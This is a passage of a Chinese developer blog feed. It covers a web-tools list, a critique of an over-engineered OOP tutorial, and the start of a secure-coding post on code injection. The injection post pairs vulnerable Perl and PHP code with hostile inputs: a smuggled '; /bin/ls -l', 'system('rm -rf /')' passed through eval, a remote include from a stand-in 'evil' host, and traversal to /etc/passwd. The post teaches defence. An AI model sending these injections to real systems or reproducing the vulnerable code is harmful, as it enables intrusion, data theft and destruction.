<li><strong><a href="http://a.quil.la/">Quilla</a> </strong>提供一个人们可以找到你的短网站服务，在那里，当人们提交到你的短网址上的请求会给你发邮件。好像是一种HTTP到SMTP的代理服务。</li>
</ul>
<ul>
<li><a href="http://apify.heroku.com/resources" target="_blank"><strong>Apify</strong></a><strong>：</strong>公开锁定在HTML文档没有任何API数据集。APIfy从结构标记中提取数据，并将其转换为JSON APIs。</li>
</ul>
<ul>
<li><a href="http://validator.w3.org/unicorn/" target="_blank"><strong>Unicorn</strong></a><strong>：</strong>W3C统一的验证程序，可在各种流行的HTML和CSS验证器中执行各种检查。类似工具：<a href="http://lint.brihten.com/html/">HTML lint</a>。</li>
</ul>
<ul>
<li><strong><a href="http://jsonlint.com/">JSONLint</a> </strong>JSON 格式验证程序</li>
</ul>
<ul>
<li><a href="http://validator.w3.org/feed/" target="_blank"><strong>Feed validator</strong></a><strong>：</strong>支持W3C验证，为RSS和ATOM提供阅读源。</li>
</ul>
<ul>
<li><a href="http://validator.w3.org/checklink" target="_blank"><strong>Link checker</strong></a><strong>：</strong>从网站中提取链接（递归）并确保没有链接被定义为两次（重复定义），所有的链接被引用并警告HTTP重新定向。</li>
</ul>
<ul>
<li><a href="http://www.host-tracker.com/" target="_blank"><strong>Host tracker</strong></a><strong>：</strong>通过分布式ping/跟踪检查、定期监测、邮件/SMS /IM通知和统计进行网站检测性服务。类似工具有：<a href="http://www.downforeveryoneorjustme.com/">Down for everyone or just me</a>, <a href="http://tools.pingdom.com/ping/">Pimgdom ping service</a></li>
</ul>
<ul>
<li><strong><a href="http://www.viewdns.info/">ViewDNS</a> </strong>一组 DNS 和网络工具，如：反向IP解析，DNS记录查询或traceroute之类的。</li>
</ul>
<ul>
<li><strong><a href="http://www.necrohost.com/">Necrohost</a>  </strong>一个URL列表来模拟不同网络链接的问题，如：响应慢，无法解析DNS，或是404什么的。</li>
</ul>
<ul>
<li><strong><a href="https://code.google.com/p/mirrorrr/">Mirrorrr</a>  </strong>一个可以用来镜像某网页的应用（经常被国人用来搞Web 代理来翻墙）。</li>
</ul>
<ul>
<li><strong><a href="http://certlogik.com/ssl-checker/">SSL Checker</a>  </strong>测试SSL认证</li>
</ul>
<ul>
<li><strong><a href="http://certlogik.com/decoder/">CSR/Cert decoder</a>  </strong>对你的CSR和SSL认证decode检查。</li>
</ul>
<ul>
<li><strong><a href="http://loadzen.com/">Loadzen</a>  </strong>Web压力测试工具（注：以前酷壳介绍过《<a href="https://coolshell.cn/articles/2589.html" target="_blank">十个Web压力测试工具</a>》）</li>
</ul>
<ul>
<li><a href="http://tools.pingdom.com/fpt/" target="_blank"><strong>Pingdom Full page test</strong></a><strong>：</strong>允许用户测试网页记载时间、分析、监控，发现瓶颈并导出HAR格式的结果。类似工具：<a href="http://www.webpagetest.org/">Web page test</a>。</li>
</ul>
<ul>
<li><strong><a href="https://developers.google.com/speed/pagespeed/insights">Google PageSpeed Insights</a> </strong>Analyzes the content of a web page, then generates suggestions to make that page faster.</li>
</ul>
<ul>
<li><a href="http://www.softwareishard.com/har/viewer/" target="_blank"><strong>HAR viewer</strong></a><strong>：</strong>通过 HTTP 追踪工具创建可视化的HTTP Archive (HAR)日志文件。</li>
</ul>
<ul>
<li><a href="http://www.corsproxy.com/" target="_blank"><strong>CORS proxy</strong></a><strong>：</strong>通常会由于相同的域而被阻止，而这款工具在网站上允许JavaScript代码访问其他域上的资源，</li>
</ul>
<ul>
<li><a href="https://browserling.com/" target="_blank"><strong>Browserling</strong></a><strong>：</strong>支持使用所有主要浏览器以及各种版本进行交互式跨浏览器测试。</li>
</ul>
<ul>
<li><a href="http://www.websocket.org/echo.html" target="_blank"><strong>WebSocket Echo Test</strong></a><strong>:</strong> 从浏览器定向到WebSocket echo服务器进行WebSocket连接测试。</li>
</ul>
<ul>
<li><a href="http://developer.yahoo.com/yql/" target="_blank"><strong>YQL</strong></a><strong>：</strong>极富表现力类似于SQL的语言，允许您查询、筛选和联接数据跨Web服务。</li>
</ul>
<ul>
<li><strong><a href="http://webshell.io/">Webshell</a> </strong>使用命令行脚本的方式来调用一些Web API。</li>
</ul>
<ul>
<li><a href="http://pipes.yahoo.com/pipes/" target="_blank"><strong>Yahoo Pipes</strong></a><strong>：</strong>一个图形化的用户界面，用于创建数据混搭，生成聚合Web源，Web页面和其他服务。</li>
</ul>
<ul>
<li><a href="http://apiary.io/" target="_blank"><strong>Apiary</strong></a><strong>：</strong>语言和工具用于生成REST API文档及进行交互式督查。类似工具：<a href="http://swagger.wordnik.com/">Swagger</a>。</li>
</ul>
<ul>
<li><strong><a href="http://jsfiddle.net/">JSFiddle</a>  </strong>一个在线的代码编辑可以让你编译一些HTML, CSS 和 JavaScript的东西，并演示之。相似工具: <a href="http://jsbin.com/">JSBin</a></li>
</ul>
<ul>
<li><a href="https://developers.google.com/feed/v1/jsondevguide">Google Feed API</a> 你可以使用这个API来查询有RSS Feed的网站 (<a href="http://ajax.googleapis.com/ajax/services/feed/lookup?v=1.0&amp;q=http://ivanzuzak.info/">example</a>)，或是搜索有RSS Feed(<a href="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&amp;q=ivan%20zuzak">example</a>) ，或是把JSON变成一个JSON返回 (<a href="https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&amp;q=http://ivanzuzak.info/atom.xml">example</a>)</li>
</ul>
<h4>未在列表的工具</h4>
<ul>
<li><a href="http://www.fiddler2.com/fiddler2/">Fiddler</a> &#8212; 可能是最强大最好用的Web调试工具之一，它能记录所有客户端和服务器的http和https请求，允许你监视，设置断点，甚至修改输入输出数据. 使用Fiddler无论对开发还是测试来说，都有很大的帮助。.</li>
</ul>
<ul>
<li><a href="http://grids.heroku.com/">960 grid system generator</a> 和 <a href="http://meyerweb.com/eric/tools/css/reset/">CSS reset</a> &#8212; 两个关注于Web站点设计的工具。</li>
</ul>
<ul>
<li><a href="http://www.nuvolabase.com/site/index.html">NuvolaBase</a> &#8212; 一个可以共享个人私有数据的解决方案。正如作者所说，这不是一个开发工具。</li>
</ul>
<ul>
<li><a href="https://openexchangerates.org/">Open exchange rates</a> &#8212; 一个和汇率货币相关的JSON式的API。这样的API你可以到 <a href="http://www.programmableweb.com/">Programmable Web</a> 上查找。</li>
</ul>
<ul>
<li><a href="https://workflowy.com/">Workflowy</a>, <a href="http://www.lastcalc.com/">LastCalc</a>, <a href="http://codepad.org/">Codepad</a>, <a href="http://www.mailinator.com/">Mailinator</a> and <a href="http://10minutemail.com/">10MinuteMail</a>, <a href="https://onetimesecret.com/">One time secret</a> and <a href="http://copypastecharacter.com/">CopyPasteCharacter</a> &#8212; 这些App似乎和Web开发没什么关系。</li>
</ul>
<ul>
<li><a href="https://browsershots.org/">Browsershots</a> &#8212; 一个用来测试网页在不同平台下的工具。（参看）</li>
</ul>
<ul>
<li><a href="http://scriptular.com/">Scriptular</a> and <a href="http://rubular.com/">Rubular</a> &#8212; 正则表达式工具，这样的工具太多了，如： <a href="http://refiddle.com/">ReFiddle</a>, <a href="http://regexpal.com/">Regex pal</a> and <a href="http://www.txt2re.com/">Txt2Re</a>。</li>
</ul>
<p>（全文完）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/2589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/07/get_more_web_traffic-150x150.jpg" alt="十个免费的Web压力测试工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2589.html" class="wp_rp_title">十个免费的Web压力测试工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/10/HTTP-770x513-300x200-1-150x150.jpg" alt="HTTP的前世今生" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_title">HTTP的前世今生</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/17381.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/07/PerfTest-150x150.png" alt="性能测试应该怎么做？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17381.html" class="wp_rp_title">性能测试应该怎么做？</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8767.html">Web工程师的工具箱</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8767.html/feed</wfw:commentRss>
			<slash:comments>41</slash:comments>
		
		
			</item>
		<item>
		<title>如此理解面向对象编程</title>
		<link>https://coolshell.cn/articles/8745.html</link>
					<comments>https://coolshell.cn/articles/8745.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Thu, 13 Dec 2012 00:19:28 +0000</pubDate>
				<category><![CDATA[Java语言]]></category>
		<category><![CDATA[程序设计]]></category>
		<category><![CDATA[编程语言]]></category>
		<category><![CDATA[轶事趣闻]]></category>
		<category><![CDATA[Coding]]></category>
		<category><![CDATA[Object-Oriented]]></category>
		<category><![CDATA[OOP]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8745</guid>

					<description><![CDATA[<p>从Rob Pike 的 Google+上的一个推看到了一篇叫《Understanding Object Oriented Programming》的文章，我先把...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8745.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8745.html">如此理解面向对象编程</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>从Rob Pike 的 Google+上的一个推看到了一篇叫《<a href="http://www.csis.pace.edu/~bergin/patterns/ppoop.html" target="_blank">Understanding Object Oriented Programming</a>》的文章，我先把这篇文章简述一下，然后再说说老牌黑客Rob Pike的评论。</p>
<p>先看这篇教程是怎么来讲述OOP的。它先给了下面这个问题，这个问题需要输出一段关于操作系统的文字：假设Unix很不错，Windows很差。</p>
<p>这个把下面这段代码描述成是<strong>Hacker Solution</strong>。（这帮人觉得下面这叫黑客？我估计这帮人真是没看过C语言的代码）</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class PrintOS
{
	public static void main(final String[] args)
	{
		String osName = System.getProperty(&quot;os.name&quot;) ;
		if (osName.equals(&quot;SunOS&quot;) || osName.equals(&quot;Linux&quot;))
		{
			System.out.println(&quot;This is a UNIX box and therefore good.&quot;) ;
		}
		else if (osName.equals(&quot;Windows NT&quot;) || osName.equals(&quot;Windows 95&quot;))
		{
			System.out.println(&quot;This is a Windows box and therefore bad.&quot;) ;
		}
		else
		{
			System.out.println(&quot;This is not a box.&quot;) ;
		}
	}
}</pre>
<p>然后开始用面向对象的编程方式一步一步地进化这个代码。</p>
<p>先是以过程化的思路来重构之。</p>
<p><span id="more-8745"></span></p>
<h4>过程化的方案</h4>
<pre data-enlighter-language="java" class="EnlighterJSRAW">public class PrintOS
{
	private static String unixBox()
	{
		return &quot;This is a UNIX box and therefore good.&quot; ;
	}
	private static String windowsBox()
  	{
		return &quot;This is a Windows box and therefore bad.&quot; ;
	}
	private static String defaultBox()
	{
		return &quot;This is not a box.&quot; ;
	}
	private static String getTheString(final String osName)
	{
		if (osName.equals(&quot;SunOS&quot;) || osName.equals(&quot;Linux&quot;))
		{
			return unixBox() ;
		}
		else if (osName.equals(&quot;Windows NT&quot;) ||osName.equals(&quot;Windows 95&quot;))
		{
			return windowsBox() ;
		}
		else
		{
			return defaultBox() ;
		}
  	}
	public static void main(final String[] args)
	{
		System.out.println(getTheString(System.getProperty(&quot;os.name&quot;))) ;
	}
}</pre>
<p>然后是一个幼稚的面向对象的思路。</p>
<h4>幼稚的面向对象编程</h4>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class PrintOS
{
	public static void main(final String[] args)
  	{
		System.out.println(OSDiscriminator.getBoxSpecifier().getStatement()) ;
 	}
}</pre>
<p>&nbsp;</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class OSDiscriminator // Factory Pattern
{
	private static BoxSpecifier theBoxSpecifier = null ;
  	public static BoxSpecifier getBoxSpecifier()
	{
		if (theBoxSpecifier == null)
		{
			String osName = System.getProperty(&quot;os.name&quot;) ;
 			if (osName.equals(&quot;SunOS&quot;) || osName.equals(&quot;Linux&quot;))
 			{
				theBoxSpecifier = new UNIXBox() ;
			}
			else if (osName.equals(&quot;Windows NT&quot;) || osName.equals(&quot;Windows 95&quot;))
			{
				theBoxSpecifier = new WindowsBox() ;
			}
			else
			{
				theBoxSpecifier = new DefaultBox () ;
			}
		}
		return theBoxSpecifier ;
	}
}</pre>
<p>&nbsp;</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public interface BoxSpecifier
{
	String getStatement() ;
}</pre>
<p>&nbsp;</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class DefaultBox implements BoxSpecifier
{
	public String getStatement()
	{
		return &quot;This is not a box.&quot; ;
  	}
}</pre>
<p>&nbsp;</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class UNIXBox implements BoxSpecifier
{
	public String getStatement()
	{
		return &quot;This is a UNIX box and therefore good.&quot; ;
  	}
}</pre>
<p>&nbsp;</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class WindowsBox implements BoxSpecifier
{
  	public String getStatement()
	{
		return &quot;This is a Windows box and therefore bad.&quot; ;
	}
}</pre>
<p>他们觉得上面这段代码没有消除if语句，他们说这叫代码的“logic bottleneck”（逻辑瓶颈），因为如果你要增加一个操作系统的判断的话，你不但要加个类，还要改那段if-else的语句。</p>
<p>所以，他们整出一个叫Sophisticated的面向对象的解决方案。</p>
<h4>OO大师的方案</h4>
<p>注意其中的Design Pattern</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class PrintOS
{
  	public static void main(final String[] args)
  	{
		System.out.println(OSDiscriminator.getBoxSpecifier().getStatement()) ;
  	}
}</pre>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class OSDiscriminator // Factory Pattern
{
  	private static java.util.HashMap storage = new java.util.HashMap() ;

 	public static BoxSpecifier getBoxSpecifier()
	{
		BoxSpecifier value = (BoxSpecifier)storage.get(System.getProperty(&quot;os.name&quot;)) ;
		if (value == null)
			return DefaultBox.value ;
		return value ;
 	}
  	public static void register(final String key, final BoxSpecifier value)
  	{
		storage.put(key, value) ; // Should guard against null keys, actually.
  	}
  	static
  	{
		WindowsBox.register() ;
  		UNIXBox.register() ;
  		MacBox.register() ;
  	}
}</pre>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public interface BoxSpecifier
{
  	String getStatement() ;
}</pre>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class DefaultBox implements BoxSpecifier // Singleton Pattern
{
	public static final DefaultBox value = new DefaultBox () ;
	private DefaultBox() { }
	public String getStatement()
	{
		return &quot;This is not a box.&quot; ;
	}
}</pre>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class UNIXBox implements BoxSpecifier // Singleton Pattern
{
 	public static final UNIXBox value = new UNIXBox() ;
	private UNIXBox() { }
	public  String getStatement()
   	{
		return &quot;This is a UNIX box and therefore good.&quot; ;
 	}
  	public static final void register()
  	{
		OSDiscriminator.register(&quot;SunOS&quot;, value) ;
  		OSDiscriminator.register(&quot;Linux&quot;, value) ;
 	}
}</pre>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class WindowsBox implements BoxSpecifier  // Singleton Pattern
{
	public  static final WindowsBox value = new WindowsBox() ;
	private WindowsBox() { }
	public String getStatement()
	{
		return &quot;This is a Windows box and therefore bad.&quot; ;
  	}
  	public static final void register()
  	{
		OSDiscriminator.register(&quot;Windows NT&quot;, value) ;
  		OSDiscriminator.register(&quot;Windows 95&quot;, value) ;
	}
}</pre>
<pre data-enlighter-language="java" class="EnlighterJSRAW">
public class MacBox implements BoxSpecifier // Singleton Pattern
{
 	public static final MacBox value = new MacBox() ;
	private MacBox() { }
	public  String getStatement()
   	{
		return &quot;This is a Macintosh box and therefore far superior.&quot; ;
 	}
  	public static final void register()
  	{
		OSDiscriminator.register(&quot;Mac OS&quot;, value) ;
 	}
}</pre>
<p>作者还非常的意地说，他加了一个“Mac OS”的东西。<strong>老实说，当我看到最后这段OO大师搞出来的代码，我快要吐了</strong>。我瞬间想到了两件事：一个是以前酷壳上的《<a style="line-height: 13px;" title="面向对象是个骗局？！" href="https://coolshell.cn/articles/3036.html" target="_blank">面向对象是个骗局</a>》和 《<a style="line-height: 13px;" title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">各种流行的编程方式</a>》中说的“设计模式驱动编程”，另一个我想到了那些被敏捷洗过脑的程序员和咨询师，也是这种德行。</p>
<p>于是我去看了一下第一作者<a href="http://csis.pace.edu/~bergin/" target="_blank">Joseph Bergin的主页</a>，这个Ph.D是果然刚刚完成了一本关于敏捷和模式的书。</p>
<h4>Rob Pike的评论</h4>
<p>（Rob Pike是当年在Bell lab里和Ken一起搞Unix的主儿，后来和Ken开发了UTF-8，现在还和Ken一起搞Go语言。注：不要以为Ken和Dennis是基友，其实他们才是真正的老基友！）</p>
<p>Rob Pike在他的<a href="https://plus.google.com/101960720994009339267/posts/hoJdanihKwb" target="_blank">Google+的这贴</a>里评论到这篇文章——</p>
<p>他并不确认这篇文章是不是搞笑？但是他觉得这些个写这篇文章是很认真的。他说他要评论这篇文章是因为他们是一名Hacker，至少这个词出现在这篇文章的术语中。</p>
<p>他说，这个程序根本就不需要什么Object，只需要一张小小的配置表格，里面配置了对应的操作系统和你想输出的文本。这不就完了。这么简单的设计，非常容易地扩展，他们那个所谓的Hack Solution完全就是笨拙的代码。后面那些所谓的代码进化相当疯狂和愚蠢的，这个完全误导了对编程的认知。</p>
<p>然后，他还说，<strong>他觉得这些OO的狂热份子非常害怕数据，他们喜欢用多层的类的关系来完成一个本来只需要检索三行数据表的工作</strong>。他说他曾经听说有人在他的工作种用各种OO的东西来替换While循环。（我听说中国Thoughtworks那帮搞敏捷的人的确喜欢用Object来替换所有的if-else语句，他们甚至还喜欢把函数的行数限制在10行以内）</p>
<p>他还给了一个链接<a href="http://prog21.dadgum.com/156.html">http://prog21.dadgum.com/156.html</a>，你可以读一读。最后他说，<strong>OOP的本质就是——对数据和与之关联的行为进行编程</strong>。便就算是这样也不完全对，因为：</p>
<p style="text-align: center;"><strong>Sometimes data is just data and functions are just functions.</strong></p>
<h4>我的理解</h4>
<p>我觉得，这篇文章的例子举得太差了，差得感觉就像是OO的高级黑。面向对象编程注重的是：<strong>1）数据和其行为的打包封装，2）程序的接口和实现的解耦</strong>。你那怕，举一个多个开关和多个电器的例子，不然就像STL中，一个排序算法对多个不同容器的例子，都比这个例子要好得多得多。老实说，Java SDK里太多这样的东西了。</p>
<p>我以前给一些公司讲一些设计模式的培训课，我一再提到，<strong>那23个经典的设计模式和OO半毛钱关系没有</strong>，只不过人家用OO来实现罢了。<strong>设计模式就三个准则：1）中意于组合而不是继承，2）依赖于接口而不是实现，3）高内聚，低耦合。你看，这完全就是Unix的设计准则</strong>。</p>
<p>（全文完）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/4535.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/1.jpg" alt="一些软件设计的原则" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4535.html" class="wp_rp_title">一些软件设计的原则</a></li><li ><a href="https://coolshell.cn/articles/3036.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/19.jpg" alt="面向对象是个骗局？！" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3036.html" class="wp_rp_title">面向对象是个骗局？！</a></li><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg" alt="IoC/DIP其实是一种管理思想" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a></li><li ><a href="https://coolshell.cn/articles/8990.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/02/linus_pointer_to_pointer-150x150.jpg" alt="Linus：利用二级指针删除单向链表" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8990.html" class="wp_rp_title">Linus：利用二级指针删除单向链表</a></li><li ><a href="https://coolshell.cn/articles/8961.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/01/kiss-150x150.png" alt="从面向对象的设计模式看软件设计" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8961.html" class="wp_rp_title">从面向对象的设计模式看软件设计</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8745.html">如此理解面向对象编程</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8745.html/feed</wfw:commentRss>
			<slash:comments>185</slash:comments>
		
		
			</item>
		<item>
		<title>程序员疫苗：代码注入</title>
		<link>https://coolshell.cn/articles/8711.html</link>
					<comments>https://coolshell.cn/articles/8711.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Mon, 10 Dec 2012 00:34:48 +0000</pubDate>
				<category><![CDATA[Web开发]]></category>
		<category><![CDATA[网络安全]]></category>
		<category><![CDATA[CRSF]]></category>
		<category><![CDATA[SQL]]></category>
		<category><![CDATA[Web]]></category>
		<category><![CDATA[XSS]]></category>
		<category><![CDATA[安全]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8711</guid>

					<description><![CDATA[<p>几个月在我的微博上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8711.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8711.html">程序员疫苗：代码注入</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright  wp-image-8730" title="程序员疫苗" src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710.jpg" alt="" width="245" height="206" srcset="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710.jpg 350w, https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-300x252.jpg 300w, https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-321x270.jpg 321w" sizes="(max-width: 245px) 100vw, 245px" />几个月在<a href="http://weibo.com/haeol" target="_blank">我的微博</a>上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。</p>
<p>我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质的文章，也算是热热身。希望大家喜欢，先向大家介绍第一注疫苗——代码注入。</p>
<h4>Shell注入</h4>
<p>我们先来看一段perl的代码：</p>
<p>[perl]use CGI qw(:standard);<br />
$name = param(&#8216;name&#8217;);<br />
$nslookup = &quot;/path/to/nslookup&quot;;<br />
print header;<br />
if (open($fh, &quot;$nslookup $name|&quot;)) {<br />
    while (&lt;$fh&gt;) {<br />
        print escapeHTML($_);<br />
        print &quot;&lt;br&gt;\n&quot;;<br />
    }<br />
    close($fh);<br />
}[/perl]</p>
<p>如果用户输入的参数是：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">coolshell.cn%20%3B%20/bin/ls%20-l</code></p>
<p>那么，这段perl的程序就成了：</p>
<p><span id="more-8711"></span></p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">/path/to/nslookup coolshell.cn ; /bin/ls -l</code></p>
<p>我们再来看一段PHP的程序：</p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$myvar = &#039;somevalue&#039;;
$x = $_GET[&#039;arg&#039;];
eval(&#039;$myvar = &#039; . $x . &#039;;&#039;);</pre>
<p>&#8220;<code>eval</code>&#8220;的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果&#8221;arg&#8221;如果被设成&#8221;<code>10; system('rm -rf /')</code>&#8220;，后面的&#8221;<code>system('rm -rf /')</code>&#8220;代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“<a title="一个空格引发的惨剧" href="https://coolshell.cn/articles/4875.html" target="_blank">一个空格引发的悲剧</a>”）</p>
<p>再来看一个PHP的代码</p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$isadmin= false;
...
...
foreach ($_GET as $key =&gt; $value) {
  $$key = $value;
}</pre>
<p>如果攻击者在查询字符串中给定&#8221;isadmin=1&#8243;，那$isadmin将会被设为值 &#8220;1&#8221;，然后攻击值就取得了网站应用的admin权限了。</p>
<p>再来看一个PHP的示例：</p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$action = &#039;login&#039;;
   if (__isset( $_GET[&#039;act&#039;] ) )
      $action = $_GET[&#039;act&#039;];
   require( $action . &#039;.php&#039; ); </pre>
<p>这个代码相当危险，攻击者有可能可以干这些事：</p>
<ul>
<li><code>/test.php?act=<strong>http://evil/exploit</strong></code> &#8211; 注入远程机器上有漏洞的文件。</li>
<li><code>/test.php?act=<strong>/home/www/bbs/upload/exploit</strong></code> &#8211; 从一个已经上载、叫做exploit.php文件运行其代码。</li>
<li><code>/test.php?act=<strong>../../../../etc/passwd%00</strong></code> &#8211; 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除<code>.php</code>扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值&#8221;magic_quotes_gpc = On&#8221;可以终止这种攻击)</li>
</ul>
<p>这样的示例有很多，只要你的程序有诸如：<code>system()</code>、<code>StartProcess()</code>、<code>java.lang.Runtime.exec()</code>、<code>System.Diagnostics.Process.Start()</code>以及类似的应用程序接口，都是比较危险的，最好不要让其中的字符串去拼装用户的输入。</p>
<p>PHP提供<code><a href="http://www.php.net/manual/en/function.escapeshellarg.php" rel="nofollow">escapeshellarg()</a></code>和<code><a href="http://www.php.net/manual/en/function.escapeshellcmd.php" rel="nofollow">escapeshellcmd()</a></code>以在调用方法以前进行编码。然而，实际上并不建议相信这些方法是安全的 。</p>
<h4>SQL注入</h4>
